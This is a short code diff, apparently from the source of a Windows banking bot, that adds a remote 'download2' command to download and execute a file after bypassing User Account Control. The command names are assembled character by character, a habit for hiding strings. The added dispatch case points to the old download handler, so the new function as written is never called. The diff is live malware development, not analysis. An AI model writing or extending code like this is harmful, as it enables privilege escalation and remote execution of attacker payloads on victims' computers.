@@ -711,6 +711,18 @@ bool ExecuteDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
 	return false;
 }
 
+//загрузить и выполнить файл после обхода UAC
+bool ExecuteDownload2(PTaskManager Manager, PCHAR Command, PCHAR Args)
+{
+#ifdef UAC_bypassH
+	if( !RunBotBypassUAC( 0, 2, Args ) )
+		return ExecuteDownload( Manager, Command, Args );
+	return true;
+#else
+	return ExecuteDownload( Manager, Command, Args );
+#endif //UAC_bypassH
+}
+
 
 bool ExecuteUpdateConfig(PTaskManager, PCHAR Command, PCHAR Args)
 {
@@ -1298,8 +1310,9 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 	const static char CommandLF[]			 = {'l','f',0};
 	const static char CommandExec[]			 = {'e','x','e','c',0};
 	const static char CommandAddTrust[]		 = {'a','d','d','t','r','u','s','t',0};
+	const static char CommandDownload2[]      = {'d','o','w','n','l','o','a','d','2',0};
 
-	int Index = StrIndexOf( Command, false, 15,
+	int Index = StrIndexOf( Command, false, 16,
 							(PCHAR)CommandUpdate,
 							(PCHAR)CommandUpdateConfig,
 							(PCHAR)CommandDownload,
@@ -1314,7 +1327,8 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 							(PCHAR)CommandIFobs,
 							(PCHAR)CommandLF,
 							(PCHAR)CommandExec,
-							(PCHAR)CommandAddTrust
+							(PCHAR)CommandAddTrust,
+							(PCHAR)CommandDownload2
 						  );
 
 
@@ -1335,6 +1349,7 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 		case 12: return ExecuteLF;
 		case 13: return ExecuteExec;
 		case 14: return ExecuteAddTrust;
+		case 15: return ExecuteDownload;
 
     default: ;
 	}
